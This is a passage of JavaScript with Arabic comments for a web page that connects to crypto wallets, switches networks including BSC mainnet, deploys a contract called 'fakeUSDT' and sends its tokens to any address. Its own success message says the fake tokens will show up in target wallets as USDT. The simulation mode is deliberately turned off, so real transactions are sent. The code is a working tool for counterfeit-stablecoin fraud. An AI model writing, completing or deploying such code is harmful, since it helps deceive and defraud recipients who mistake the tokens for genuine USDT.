    localStorage.removeItem('fakeUSDT_contract_network');
    savedContractAddress = null;
    savedContractNetwork = null;

    // قطع الاتصال بالمحفظة الحالية
    if (provider && provider.provider && provider.provider.close) {
        try {
            provider.provider.close();
        } catch (error) {
            console.log("خطأ في إغلاق اتصال المزود:", error);
        }
    }

    // إعادة تعيين المتغيرات العالمية
    provider = null;
    signer = null;
    fakeUSDTContract = null;
    fakeUSDTAddress = null;

    // تعطيل الأزرار
    deployBtn.disabled = true;
    sendBtn.disabled = true;
    multiSendBtn.disabled = true;

    // عرض رسالة للمستخدم
    updateNetworkStatus(`
        <div class="success">تم نسيان المحفظة المفضلة بنجاح</div>
        <div style="margin-top: 10px;">
            <button class="primary-btn" onclick="init()">عرض المحافظ المتاحة</button>
        </div>
    `, 'success');

    // تحديث حالة المحفظة
    updateWalletStatus('المحفظة: غير متصلة');

    // إعادة تحميل الصفحة بعد ثانيتين لضمان إعادة تهيئة كاملة
    setTimeout(() => {
        window.location.reload();
    }, 2000);
}

// دالة لتغيير المحفظة
function changeWallet() {
    // قطع الاتصال بالمحفظة الحالية أولاً
    if (provider && provider.provider && provider.provider.close) {
        try {
            provider.provider.close();
        } catch (error) {
            console.log("خطأ في إغلاق اتصال المزود:", error);
        }
    }

    // إعادة تعيين المتغيرات العالمية
    provider = null;
    signer = null;

    // تعطيل الأزرار
    deployBtn.disabled = true;
    sendBtn.disabled = true;
    multiSendBtn.disabled = true;

    // تحديث حالة المحفظة
    updateWalletStatus('المحفظة: غير متصلة');

    // عرض خيارات المحافظ المتاحة
    const providers = detectWalletProviders();

    if (Object.keys(providers).length === 0) {
        updateNetworkStatus(`
            <div class="error">خطأ: لم يتم العثور على أي محفظة</div>
            <div style="margin-top: 10px;">
                يمكنك تثبيت إحدى المحافظ التالية:
                <div class="button-group" style="margin-top: 10px;">
                    <a href="https://metamask.io/download/" target="_blank" class="primary-btn">تثبيت MetaMask</a>
                    <a href="https://trustwallet.com/browser-extension" target="_blank" class="primary-btn">تثبيت Trust Wallet</a>
                </div>
            </div>
        `, 'error');
        return;
    }

    // إضافة رسالة توضيحية
    updateNetworkStatus(`
        <div class="info">يرجى اختيار المحفظة التي تريد استخدامها:</div>
        <div class="warning" style="margin-top: 10px; margin-bottom: 10px;">
            <strong>ملاحظة هامة:</strong> إذا كنت تواجه مشاكل في تغيير المحفظة، يرجى إعادة تحميل الصفحة أولاً.
        </div>
    `, 'info');

    showWalletOptions(providers, preferredWallet);

    // إضافة زر لإعادة تحميل الصفحة
    const reloadButton = document.createElement('button');
    reloadButton.textContent = 'إعادة تحميل الصفحة';
    reloadButton.className = 'secondary-btn';
    reloadButton.style.marginTop = '15px';
    reloadButton.onclick = () => window.location.reload();
    networkStatus.appendChild(reloadButton);
}

// دالة الاتصال بالمحفظة (للتوافق مع الكود القديم)
async function connectWallet() {
    // استخدام الدالة الجديدة مع المزود الافتراضي
    await connectToSpecificWallet(window.ethereum && window.ethereum.isMetaMask ? 'MetaMask' :
                                 (window.ethereum && window.ethereum.isTrust ? 'Trust Wallet' : 'محفظة الويب'));
}

// دالة تحديث حالة الشبكة
function updateNetworkStatus(message, type = '') {
    // إذا كانت الرسالة دالة، استدعها مع المحتوى الحالي
    if (typeof message === 'function') {
        const currentHTML = networkStatus.innerHTML;
        networkStatus.innerHTML = message(currentHTML);
    } else {
        networkStatus.innerHTML = message;
    }

    if (type) {
        networkStatus.className = type;
    }
}

// دالة تحديث حالة المحفظة
function updateWalletStatus(message, type = '') {
    walletStatus.textContent = message;
    walletStatus.className = type;
}

// دالة الحصول على معلومات الشبكة من chainId
function getNetworkInfoByChainId(chainId) {
    // تحويل chainId إلى سلسلة سداسية عشرية إذا كان رقمًا
    const chainIdHex = typeof chainId === 'number' ? '0x' + chainId.toString(16) : chainId;

    for (const [id, info] of Object.entries(NETWORKS)) {
        if (info.chainId.toLowerCase() === chainIdHex.toLowerCase()) {
            // إضافة اسم الشبكة المعروض للمستخدم
            return {
                id,
                ...info,
                // استخدام chainName كاسم رئيسي للشبكة
                chainName: info.chainName || info.name,
                // للتوافق مع الكود القديم
                name: info.chainName || info.name
            };
        }
    }

    return null;
}

// دالة معالجة تغيير الشبكة
async function handleChainChanged(chainId) {
    // إعادة تحميل الصفحة عند تغيير الشبكة
    window.location.reload();
}

// دالة معالجة تغيير الشبكة المحددة
function handleNetworkSelectChange() {
    const newNetwork = networkSelect.value;
    selectedNetwork = newNetwork;
    switchNetwork(newNetwork);
}

// دالة التبديل إلى شبكة محددة
async function switchNetwork(networkId) {
    const network = NETWORKS[networkId];
    if (!network) {
        updateNetworkStatus(`خطأ: الشبكة غير مدعومة (${networkId})`, 'error');
        return false;
    }

    try {
        updateNetworkStatus(`جاري التبديل إلى شبكة: ${network.chainName}...`, 'info');

        // التحقق من وجود مزود
        if (!window.ethereum) {
            throw new Error("لم يتم العثور على مزود المحفظة");
        }

        // التحقق من المزود المناسب في حالة وجود محافظ متعددة
        let targetProvider = window.ethereum;

        // إذا كان هناك محافظ متعددة، استخدم المزود المناسب
        if (window.ethereum.providers) {
            // استخدام المزود المرتبط بالمحفظة المفضلة إذا كان موجودًا
            if (preferredWallet) {
                for (const provider of window.ethereum.providers) {
                    if ((preferredWallet === 'MetaMask' && provider.isMetaMask && !provider.isTrust && !provider.isTrustWallet) ||
                        (preferredWallet === 'Trust Wallet' && (provider.isTrust || provider.isTrustWallet)) ||
                        (preferredWallet === 'Coinbase Wallet' && (provider.isCoinbaseWallet || provider.isCoinbaseBrowser))) {
                        targetProvider = provider;
                        break;
                    }
                }
            }
        }

        console.log("محاولة التبديل إلى الشبكة باستخدام المزود:", targetProvider);

        // محاولة التبديل إلى الشبكة
        try {
            await targetProvider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: network.chainId }],
            });
            console.log("تم طلب التبديل إلى الشبكة:", network.chainId);
        } catch (switchError) {
            console.log("خطأ في التبديل إلى الشبكة:", switchError);

            // إذا كان الخطأ 4902، فهذا يعني أن الشبكة غير موجودة في المحفظة
            if (switchError.code === 4902) {
                console.log("الشبكة غير موجودة، محاولة إضافتها...");
                // إضافة الشبكة ثم التبديل إليها
                await targetProvider.request({
                    method: 'wallet_addEthereumChain',
                    params: [
                        {
                            chainId: network.chainId,
                            chainName: network.chainName,
                            nativeCurrency: network.nativeCurrency,
                            rpcUrls: network.rpcUrls,
                            blockExplorerUrls: network.blockExplorerUrls
                        }
                    ],
                });
                console.log("تم طلب إضافة الشبكة:", network.chainName);
            } else {
                throw switchError;
            }
        }

        // انتظار لحظة للتأكد من تطبيق التغييرات
        await new Promise(resolve => setTimeout(resolve, 1000));

        // التحقق من أن التبديل تم بنجاح
        const currentNetwork = await targetProvider.request({ method: 'eth_chainId' });
        console.log("الشبكة الحالية بعد التبديل:", currentNetwork, "الشبكة المطلوبة:", network.chainId);

        if (currentNetwork.toLowerCase() !== network.chainId.toLowerCase()) {
            console.log("لم يتم التبديل إلى الشبكة المطلوبة");

            // محاولة أخرى للتبديل
            updateNetworkStatus(`
                <div class="warning">لم يتم التبديل إلى الشبكة المطلوبة تلقائيًا.</div>
                <div>يرجى التبديل يدويًا إلى شبكة ${network.chainName} من خلال محفظتك.</div>
                <div style="margin-top: 10px;">
                    <button class="primary-btn" onclick="checkNetworkAfterManualSwitch('${networkId}')">تم التبديل يدويًا</button>
                </div>
            `, 'warning');

            return false;
        }

        // تحديث المزود بعد تغيير الشبكة
        provider = new ethers.providers.Web3Provider(targetProvider);
        signer = provider.getSigner();

        // تحديث الشبكة المحددة في واجهة المستخدم
        selectedNetwork = networkId;
        networkSelect.value = networkId;

        updateNetworkStatus(`
            <div class="success">تم التبديل إلى شبكة: ${network.chainName}</div>
            <div style="margin-top: 10px;">
                <button class="primary-btn" onclick="deployContract()">نشر العقد</button>
            </div>
        `, 'success');

        return true;
    } catch (error) {
        console.error("خطأ في التبديل إلى الشبكة:", error);

        // تحسين رسائل الخطأ
        let errorMessage = error.message;
        if (error.code === 4001) {
            errorMessage = "تم رفض طلب تغيير الشبكة من قبل المستخدم";
        } else if (error.code === 4902) {
            errorMessage = "الشبكة غير موجودة في المحفظة";
        }

        updateNetworkStatus(`
            <div class="error">خطأ في التبديل إلى شبكة ${network.chainName}:</div>
            <div>${errorMessage}</div>
            <div style="margin-top: 10px;">
                <button class="primary-btn" onclick="switchNetwork('${networkId}')">محاولة مرة أخرى</button>
                <button class="secondary-btn" onclick="window.location.reload()">إعادة تحميل الصفحة</button>
            </div>
        `, 'error');

        return false;
    }
}

// دالة للتحقق من الشبكة بعد التبديل اليدوي
async function checkNetworkAfterManualSwitch(networkId) {
    try {
        const network = NETWORKS[networkId];
        if (!network) {
            updateNetworkStatus(`خطأ: الشبكة غير مدعومة (${networkId})`, 'error');
            return;
        }

        // إعادة تهيئة المزود
        provider = new ethers.providers.Web3Provider(window.ethereum);

        // الحصول على معلومات الشبكة الحالية
        const currentNetwork = await provider.getNetwork();
        const currentNetworkInfo = getNetworkInfoByChainId(currentNetwork.chainId);

        console.log("الشبكة الحالية بعد التبديل اليدوي:", currentNetwork);
        console.log("معلومات الشبكة المستخرجة:", currentNetworkInfo);

        if (currentNetworkInfo && currentNetworkInfo.id === networkId) {
            // تم التبديل بنجاح
            selectedNetwork = networkId;
            networkSelect.value = networkId;

            // الحصول على الموقع
            signer = provider.getSigner();

            updateNetworkStatus(`
                <div class="success">تم التبديل إلى شبكة: ${network.chainName}</div>
                <div style="margin-top: 10px;">
                    <button class="primary-btn" onclick="deployContract()">نشر العقد</button>
                </div>
            `, 'success');

            // تفعيل الأزرار
            deployBtn.disabled = false;

            // استعادة العقد المحفوظ إذا كان موجودًا
            if (savedContractAddress && savedContractNetwork === networkId) {
                console.log("محاولة استعادة العقد المحفوظ:", savedContractAddress, "على شبكة", savedContractNetwork);
                await restoreSavedContract();
            }
        } else {
            // لم يتم التبديل بنجاح
            updateNetworkStatus(`
                <div class="error">لم يتم التبديل إلى الشبكة المطلوبة.</div>
                <div>الشبكة الحالية: ${currentNetworkInfo ? currentNetworkInfo.chainName : currentNetwork.name}</div>
                <div>الشبكة المطلوبة: ${network.chainName}</div>
                <div style="margin-top: 10px;">
                    <button class="primary-btn" onclick="switchNetwork('${networkId}')">محاولة مرة أخرى</button>
                </div>
            `, 'error');
        }
    } catch (error) {
        console.error("خطأ في التحقق من الشبكة:", error);
        updateNetworkStatus(`خطأ في التحقق من الشبكة: ${error.message}`, 'error');
    }
}

// دالة معالجة تغيير الحساب
async function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        // تم قطع الاتصال بالمحفظة
        updateWalletStatus('المحفظة: غير متصلة');
        deployBtn.disabled = true;
        sendBtn.disabled = true;

        // عرض رسالة للمستخدم
        updateNetworkStatus(`
            <div class="error">تم قطع الاتصال بالمحفظة</div>
            <div style="margin-top: 10px;">
                <button class="primary-btn" onclick="init()">إعادة الاتصال</button>
            </div>
        `, 'error');
    } else {
        // تم تغيير الحساب
        try {
            // إعادة تهيئة المزود للتأكد من استخدام أحدث حالة للشبكة
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();

            // الحصول على عنوان المحفظة الجديد
            const address = await signer.getAddress();

            // تحديث حالة المحفظة
            updateWalletStatus(`المحفظة: ${formatAddress(address)}`);

            // تفعيل الأزرار
            deployBtn.disabled = false;

            // إذا كان هناك عقد متصل، أعد تهيئته مع الموقع الجديد
            if (fakeUSDTContract && fakeUSDTAddress) {
                fakeUSDTContract = new ethers.Contract(fakeUSDTAddress, fakeUSDTAbi, signer);
            }

            // تحديث حالة الشبكة
            const network = await provider.getNetwork();
            const networkInfo = getNetworkInfoByChainId(network.chainId);

            if (networkInfo) {
                updateNetworkStatus(`
                    <div class="success">تم تغيير الحساب بنجاح</div>
                    <div>متصل بشبكة: ${networkInfo.chainName}</div>
                `, 'success');
            }
        } catch (error) {
            console.error("خطأ في تحديث الحساب:", error);
            updateNetworkStatus(`خطأ في تحديث الحساب: ${error.message}`, 'error');
        }
    }
}

// دالة تنسيق عنوان المحفظة
function formatAddress(address) {
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
}

// دالة نشر العقد
async function deployContract() {
    try {
        updateDeployResult('جاري التحضير لنشر العقد...');
        deployBtn.disabled = true;

        // التأكد من أننا في الوضع العادي (غير وضع المحاكاة)
        localStorage.removeItem('fakeUSDT_mock_mode'); // إزالة أي إعدادات محاكاة سابقة

        // وضع عادي - نشر عقد فعلي
        // التحقق من الشبكة المحددة في واجهة المستخدم
        const selectedNetworkId = networkSelect.value;
        const selectedNetworkInfo = NETWORKS[selectedNetworkId];

        if (!selectedNetworkInfo) {
            updateDeployResult(`خطأ: الشبكة المحددة غير مدعومة (${selectedNetworkId})`, 'error');
            deployBtn.disabled = false;
            return;
        }

        // إعادة تهيئة المزود للتأكد من استخدام أحدث حالة للشبكة
        provider = new ethers.providers.Web3Provider(window.ethereum);

        // الحصول على معلومات الشبكة الحالية
        const network = await provider.getNetwork();
        const currentNetworkInfo = getNetworkInfoByChainId(network.chainId);

        // التحقق مما إذا كانت الشبكة الحالية هي نفس الشبكة المحددة
        if (!currentNetworkInfo || currentNetworkInfo.id !== selectedNetworkId) {
            updateDeployResult(`
                <div>الشبكة الحالية (${currentNetworkInfo ? currentNetworkInfo.chainName : network.name}) مختلفة عن الشبكة المحددة (${selectedNetworkInfo.chainName}).</div>
                <div>جاري محاولة التبديل إلى الشبكة المحددة...</div>
            `, 'warning');

            // محاولة التبديل إلى الشبكة المحددة
            const switchSuccess = await switchNetwork(selectedNetworkId);

            if (!switchSuccess) {
                updateDeployResult(`
                    <div class="error">فشل التبديل إلى الشبكة المحددة (${selectedNetworkInfo.chainName}).</div>
                    <div>يرجى التبديل يدويًا إلى الشبكة المطلوبة في محفظتك ثم المحاولة مرة أخرى.</div>
                `, 'error');
                deployBtn.disabled = false;
                return;
            }

            // إعادة تهيئة المزود بعد تغيير الشبكة
            provider = new ethers.providers.Web3Provider(window.ethereum);
        }

        // الحصول على الموقع بعد التأكد من الشبكة
        signer = provider.getSigner();

        // إظهار معلومات الشبكة ورسوم المعاملات
        updateDeployResult(`
            <div>جاري نشر العقد على شبكة ${selectedNetworkInfo.chainName}...</div>
            <div>العملة الأصلية: ${selectedNetworkInfo.nativeCurrency.symbol}</div>
            <div>رسوم المعاملات المقدرة: ${ethers.utils.formatUnits(selectedNetworkInfo.gasPrice, 'gwei')} gwei</div>
            <div class="warning" style="margin-top: 10px;">
                إذا واجهت خطأ "Internal JSON-RPC error"، فقد يكون بسبب عدم وجود رصيد كافٍ من ${selectedNetworkInfo.nativeCurrency.symbol} في محفظتك.
            </div>
        `);

        // إنشاء مصنع العقد
        const factory = new ethers.ContractFactory(
            fakeUSDTAbi,
            fakeUSDTBytecode,
            signer
        );

        // نشر العقد مع تحديد سعر الغاز وحد الغاز
        console.log("بدء نشر العقد مع الإعدادات التالية:");

        // تعديل سعر الغاز وحد الغاز بناءً على الشبكة
        let gasPrice, gasLimit;

        if (selectedNetworkInfo.id === 'bsc_testnet') {
            // إعدادات خاصة لشبكة BSC Testnet - زيادة حد الغاز بشكل كبير
            gasPrice = ethers.utils.parseUnits('15', 'gwei');
            gasLimit = 3000000; // زيادة حد الغاز إلى الضعف
        } else if (selectedNetworkInfo.id === 'bsc') {
            // إعدادات خاصة لشبكة BSC Mainnet - زيادة سعر الغاز وحد الغاز لضمان نجاح المعاملة
            gasPrice = ethers.utils.parseUnits('10', 'gwei');
            gasLimit = 3000000; // زيادة حد الغاز إلى الضعف
        } else if (selectedNetworkInfo.id === 'sepolia') {
            // إعدادات خاصة لشبكة Sepolia
            gasPrice = ethers.utils.parseUnits('20', 'gwei');
            gasLimit = 3000000; // زيادة حد الغاز إلى الضعف
        } else {
            // إعدادات افتراضية للشبكات الأخرى - زيادة حد الغاز بشكل كبير
            gasPrice = selectedNetworkInfo.gasPrice ? ethers.BigNumber.from(selectedNetworkInfo.gasPrice).mul(2) : ethers.utils.parseUnits('20', 'gwei');
            gasLimit = 3000000; // زيادة حد الغاز إلى الضعف
        }

        // محاولة الحصول على سعر الغاز المقترح من الشبكة
        try {
            const feeData = await provider.getFeeData();
            if (feeData && feeData.gasPrice) {
                // استخدام سعر الغاز المقترح + 20% لضمان سرعة المعاملة
                gasPrice = feeData.gasPrice.mul(120).div(100);
                console.log("تم الحصول على سعر الغاز من الشبكة:", ethers.utils.formatUnits(gasPrice, 'gwei'), "gwei");
            }
        } catch (error) {
            console.log("فشل الحصول على سعر الغاز من الشبكة:", error.message);
            // الاستمرار باستخدام القيمة المحددة مسبقًا
        }

        console.log("- سعر الغاز:", ethers.utils.formatUnits(gasPrice, 'gwei'), "gwei");
        console.log("- حد الغاز:", gasLimit);

        // عرض رسالة للمستخدم
        updateDeployResult(`
            <div>جاري نشر العقد على شبكة ${selectedNetworkInfo.chainName}...</div>
            <div>سعر الغاز: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei</div>
            <div>حد الغاز: ${gasLimit}</div>
            <div class="info" style="margin-top: 10px;">
                يرجى الموافقة على المعاملة في نافذة المحفظة التي ستظهر.
                <br>
                تأكد من وجود رصيد كافٍ من ${selectedNetworkInfo.nativeCurrency.symbol} في محفظتك.
            </div>
        `);

        // محاولة تقدير الغاز المطلوب أولاً
        try {
            console.log("محاولة تقدير الغاز المطلوب...");
            const estimatedGas = await factory.estimateGas.deploy();
            console.log("الغاز المقدر:", estimatedGas.toString());

            // استخدام الغاز المقدر + هامش أمان كبير (50%)
            const calculatedGasLimit = estimatedGas.mul(150).div(100); // إضافة 50% كهامش أمان
            console.log("حد الغاز المحسوب (بعد التقدير):", calculatedGasLimit.toString());

            // استخدام القيمة الأكبر بين حد الغاز المحسوب والقيمة الافتراضية
            if (calculatedGasLimit.gt(ethers.BigNumber.from(gasLimit))) {
                gasLimit = calculatedGasLimit;
                console.log("استخدام حد الغاز المحسوب لأنه أكبر:", gasLimit.toString());
            } else {
                console.log("استخدام حد الغاز الافتراضي لأنه أكبر:", gasLimit.toString());
            }
        } catch (error) {
            console.log("فشل تقدير الغاز:", error.message);
            console.log("استخدام حد الغاز الافتراضي:", gasLimit.toString());
            // الاستمرار باستخدام القيمة الافتراضية
        }

        // تحديث واجهة المستخدم بالقيم النهائية
        updateDeployResult(`
            <div>جاري نشر العقد على شبكة ${selectedNetworkInfo.chainName}...</div>
            <div>سعر الغاز النهائي: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei</div>
            <div>حد الغاز النهائي: ${gasLimit.toString()}</div>
            <div class="info" style="margin-top: 10px;">
                يرجى الموافقة على المعاملة في نافذة المحفظة التي ستظهر.
                <br>
                تأكد من وجود رصيد كافٍ من ${selectedNetworkInfo.nativeCurrency.symbol} في محفظتك.
            </div>
        `);

        // نشر العقد بطريقة أكثر موثوقية
        console.log("بدء نشر العقد مع الإعدادات النهائية:");
        console.log("- سعر الغاز النهائي:", ethers.utils.formatUnits(gasPrice, 'gwei'), "gwei");
        console.log("- حد الغاز النهائي:", gasLimit.toString());

        // إنشاء بيانات نشر العقد مع إعدادات محسنة
        const deployTransaction = factory.getDeployTransaction();

        // تعديل خيارات المعاملة
        const txOptions = {
            gasPrice: gasPrice,
            gasLimit: gasLimit,
            nonce: await provider.getTransactionCount(await signer.getAddress(), "latest")
        };

        console.log("خيارات المعاملة:", txOptions);

        // إرسال المعاملة مباشرة مع الخيارات المحسنة
        const tx = await signer.sendTransaction({
            ...deployTransaction,
            ...txOptions
        });
        console.log("تم إرسال معاملة نشر العقد:", tx.hash);

        // انتظار تأكيد المعاملة
        console.log("انتظار تأكيد المعاملة...");
        const receipt = await tx.wait();
        console.log("تم تأكيد المعاملة:", receipt.transactionHash);

        // إنشاء كائن العقد من العنوان
        const contractAddress = receipt.contractAddress;
        const contract = new ethers.Contract(contractAddress, fakeUSDTAbi, signer);

        // انتظار اكتمال النشر
        await contract.deployed();

        // حفظ عنوان العقد
        fakeUSDTContract = contract;
        fakeUSDTAddress = contract.address;

        // حفظ عنوان العقد في التخزين المحلي
        localStorage.setItem('fakeUSDT_contract_address', fakeUSDTAddress);
        localStorage.setItem('fakeUSDT_contract_network', selectedNetworkId);

        // الحصول على رابط المسح الضوئي للعقد
        const explorerUrl = selectedNetworkInfo.blockExplorerUrls[0] + '/address/' + fakeUSDTAddress;

        // تحديث النتيجة
        updateDeployResult(`
            <div class="success">تم نشر العقد بنجاح!</div>
            <div><strong>عنوان العقد:</strong> <span dir="ltr">${fakeUSDTAddress}</span></div>
            <div><strong>الشبكة:</strong> ${selectedNetworkInfo.chainName}</div>
            <div><strong>العملة الأصلية:</strong> ${selectedNetworkInfo.nativeCurrency.symbol}</div>
            <div><a href="${explorerUrl}" target="_blank" class="explorer-link">عرض العقد في المسح الضوئي</a></div>
            <div class="info" style="margin-top: 10px;">
                <strong>ملاحظة هامة:</strong> يمكنك الآن إرسال توكنات USDT مزيفة إلى أي محفظة. ستظهر هذه التوكنات في المحفظة المستهدفة كتوكنات USDT.
            </div>
        `, 'success');

        // تفعيل أزرار الإرسال
        sendBtn.disabled = false;
        multiSendBtn.disabled = false;

    } catch (error) {
        console.error("خطأ في نشر العقد:", error);
        let errorMessage = error.message;

        // طباعة معلومات مفصلة عن الخطأ
        console.log("نوع الخطأ:", typeof error);
        console.log("رمز الخطأ:", error.code);
        console.log("رسالة الخطأ:", error.message);

        if (error.data) {
            console.log("بيانات الخطأ:", error.data);
        }

        if (error.transaction) {
            console.log("معلومات المعاملة:", error.transaction);
        }

        // تحسين رسائل الخطأ
        if (error.message.includes('Internal JSON-RPC error')) {
            // استخراج رسالة الخطأ الداخلية إذا كانت موجودة
            const match = error.message.match(/"message":"([^"]+)"/);
            if (match && match[1]) {
                errorMessage = match[1];
                console.log("رسالة الخطأ الداخلية:", errorMessage);
            }

            // إضافة نصائح إضافية
            errorMessage += '<br><br>نصائح للإصلاح:<br>' +
                `1. <strong>تأكد من وجود رصيد كافٍ من ${selectedNetworkInfo?.nativeCurrency?.symbol || 'العملة الأصلية'} في محفظتك</strong> (على الأقل 0.01 BNB) لدفع رسوم المعاملة.<br>` +
                '2. <strong>قم بنشر التطبيق على خادم ويب حقيقي</strong> مثل GitHub Pages أو Netlify بدلاً من الخادم المحلي.<br>' +
                '3. <strong>تأكد من أن محفظتك متصلة بشبكة BSC</strong> وليس بشبكة أخرى.<br>' +
                '4. <strong>حاول زيادة سعر الغاز (Gas Price)</strong> إلى 10 gwei أو أكثر لتسريع المعاملة.';
        } else if (error.code === 4001 || error.message.includes('user rejected')) {
            // المستخدم رفض المعاملة
            errorMessage = 'تم رفض المعاملة من قبل المستخدم. يرجى الموافقة على المعاملة في محفظتك للمتابعة.';
        } else if (error.message.includes('transaction') && error.message.includes('hash')) {
            // مشكلة في هاش المعاملة
            errorMessage = 'حدثت مشكلة في معالجة المعاملة. قد يكون ذلك بسبب:<br>' +
                '1. <strong>عدم وجود رصيد كافٍ</strong> لدفع رسوم المعاملة.<br>' +
                '2. <strong>مشكلة في الاتصال بالشبكة</strong> - حاول استخدام خادم ويب حقيقي بدلاً من الخادم المحلي.<br>' +
                '3. <strong>حد غاز منخفض جدًا</strong> - حاول زيادة حد الغاز.';
        } else if (error.message.includes('localhost') || error.message.includes('CORS')) {
            // مشكلة CORS أو الخادم المحلي
            errorMessage = 'حدثت مشكلة بسبب استخدام الخادم المحلي (localhost).<br>' +
                '<strong>الحل:</strong> قم بنشر التطبيق على خادم ويب حقيقي مثل GitHub Pages أو Netlify.';
        }

        updateDeployResult(`
            <div class="error">خطأ في نشر العقد:</div>
            <div style="margin-top: 10px;">${errorMessage}</div>
            <div style="margin-top: 15px;">
                <button class="primary-btn" onclick="deployContract()">محاولة مرة أخرى</button>
                <button class="secondary-btn" onclick="init()">العودة إلى الصفحة الرئيسية</button>
            </div>
        `, 'error');
        deployBtn.disabled = false;
    }
}

// دالة إرسال التوكنات
async function sendTokens() {
    const recipient = recipientAddress.value.trim();
    const amount = tokenAmount.value.trim();

    // التحقق من صحة المدخلات
    if (!recipient || !ethers.utils.isAddress(recipient)) {
        updateSendResult('خطأ: يرجى إدخال عنوان محفظة صحيح', 'error');
        return;
    }

    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
        updateSendResult('خطأ: يرجى إدخال مبلغ صحيح', 'error');
        return;
    }

    try {
        updateSendResult(`<div>جاري التحضير لإرسال التوكنات...</div>`);
        sendBtn.disabled = true;

        // التحقق من وجود العقد
        if (!fakeUSDTContract || !fakeUSDTAddress) {
            updateSendResult('خطأ: يرجى نشر العقد أو تجاوز النشر أولاً', 'error');
            sendBtn.disabled = false;
            return;
        }

        // التأكد من أننا في الوضع العادي (غير وضع المحاكاة)
        const isMockMode = false; // تعطيل وضع المحاكاة نهائيًا
        localStorage.removeItem('fakeUSDT_mock_mode'); // إزالة أي إعدادات محاكاة سابقة

        // الحصول على شبكة العقد المحفوظة
        const contractNetwork = localStorage.getItem('fakeUSDT_contract_network');
        if (!contractNetwork) {
            updateSendResult('خطأ: لم يتم العثور على معلومات شبكة العقد', 'error');
            sendBtn.disabled = false;
            return;
        }

        const contractNetworkInfo = NETWORKS[contractNetwork];
        if (!contractNetworkInfo) {
            updateSendResult(`خطأ: شبكة العقد غير مدعومة (${contractNetwork})`, 'error');
            sendBtn.disabled = false;
            return;
        }

        // إعادة تهيئة المزود للتأكد من استخدام أحدث حالة للشبكة
        provider = new ethers.providers.Web3Provider(window.ethereum);

        // الحصول على معلومات الشبكة الحالية
        const network = await provider.getNetwork();
        const currentNetworkInfo = getNetworkInfoByChainId(network.chainId);

        // التحقق مما إذا كانت الشبكة الحالية هي نفس شبكة العقد
        if (!currentNetworkInfo || currentNetworkInfo.id !== contractNetwork) {
            updateSendResult(`
                <div>الشبكة الحالية (${currentNetworkInfo ? currentNetworkInfo.chainName : network.name}) مختلفة عن شبكة العقد (${contractNetworkInfo.chainName}).</div>
                <div>جاري محاولة التبديل إلى شبكة العقد...</div>
            `, 'warning');

            // محاولة التبديل إلى شبكة العقد
            const switchSuccess = await switchNetwork(contractNetwork);

            if (!switchSuccess) {
                updateSendResult(`
                    <div class="error">فشل التبديل إلى شبكة العقد (${contractNetworkInfo.chainName}).</div>
                    <div>يرجى التبديل يدويًا إلى الشبكة المطلوبة في محفظتك ثم المحاولة مرة أخرى.</div>
                `, 'error');
                sendBtn.disabled = false;
                return;
            }

            // إعادة تهيئة المزود بعد تغيير الشبكة
            provider = new ethers.providers.Web3Provider(window.ethereum);
        }

        // الحصول على الموقع بعد التأكد من الشبكة
        signer = provider.getSigner();

        // إعادة ربط العقد بالموقع الجديد
        fakeUSDTContract = new ethers.Contract(fakeUSDTAddress, fakeUSDTAbi, signer);

        // تحويل المبلغ إلى وحدات التوكن (6 كسور عشرية)
        const tokenAmountWei = ethers.utils.parseUnits(amount, 6);

        // إظهار معلومات المعاملة قبل الإرسال
        updateSendResult(`
            <div>جاري إرسال ${amount} USDT إلى ${formatAddress(recipient)}...</div>
            <div>الشبكة: ${contractNetworkInfo.chainName}</div>
            <div>العملة الأصلية: ${contractNetworkInfo.nativeCurrency.symbol}</div>
            <div class="warning">يرجى الموافقة على المعاملة في محفظتك...</div>
        `);

        // التحقق مما إذا كنا في وضع المحاكاة
        let tx, receipt, txExplorerUrl;

        if (isMockMode) {
            // وضع المحاكاة - لا يتم إرسال معاملة فعلية
            console.log(`محاكاة إرسال ${amount} USDT إلى ${recipient}`);

            // إنشاء معاملة وهمية
            tx = {
                hash: "0x" + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')
            };

            updateSendResult(`
                <div>تم إرسال المعاملة (محاكاة)، جاري انتظار التأكيد...</div>
                <div>رقم المعاملة (وهمي): ${tx.hash}</div>
                <div class="info">هذه معاملة محاكاة ولن تظهر على الشبكة الفعلية.</div>
            `);

            // محاكاة انتظار تأكيد المعاملة
            await new Promise(resolve => setTimeout(resolve, 1500));

            // إنشاء إيصال وهمي
            receipt = {
                transactionHash: tx.hash,
                status: 1
            };

            // إنشاء رابط وهمي للمسح الضوئي
            txExplorerUrl = "#";
        } else {
            // وضع عادي - إرسال معاملة فعلية
            // الحصول على سعر الغاز المناسب من الشبكة
            let gasPrice;
            try {
                const feeData = await provider.getFeeData();
                if (feeData && feeData.gasPrice) {
                    // استخدام سعر الغاز المقترح + 20% لضمان سرعة المعاملة
                    gasPrice = feeData.gasPrice.mul(120).div(100);
                    console.log("تم الحصول على سعر الغاز من الشبكة:", ethers.utils.formatUnits(gasPrice, 'gwei'), "gwei");
                } else {
                    gasPrice = ethers.utils.parseUnits('5', 'gwei');
                }
            } catch (error) {
                console.log("فشل الحصول على سعر الغاز من الشبكة:", error.message);
                gasPrice = ethers.utils.parseUnits('5', 'gwei');
            }

            // إرسال التوكنات مع تحديد سعر الغاز وحد الغاز المحسنة
            console.log("إرسال التوكنات إلى:", recipient);
            console.log("المبلغ:", ethers.utils.formatUnits(tokenAmountWei, 6), "USDT");
            console.log("سعر الغاز:", ethers.utils.formatUnits(gasPrice, 'gwei'), "gwei");
            console.log("حد الغاز:", 1500000);

            // تحديد حد الغاز المناسب بناءً على الشبكة
            let gasLimit;
            if (contractNetworkInfo.id === 'bsc_testnet') {
                gasLimit = 3000000; // زيادة حد الغاز بشكل كبير لشبكة BSC Testnet
            } else if (contractNetworkInfo.id === 'bsc') {
                gasLimit = 3000000; // زيادة حد الغاز بشكل كبير لشبكة BSC
            } else if (contractNetworkInfo.id === 'sepolia') {
                gasLimit = 3000000; // زيادة حد الغاز بشكل كبير لشبكة Sepolia
            } else {
                gasLimit = 3000000; // زيادة حد الغاز بشكل كبير للشبكات الأخرى
            }

            console.log("حد الغاز المستخدم:", gasLimit);

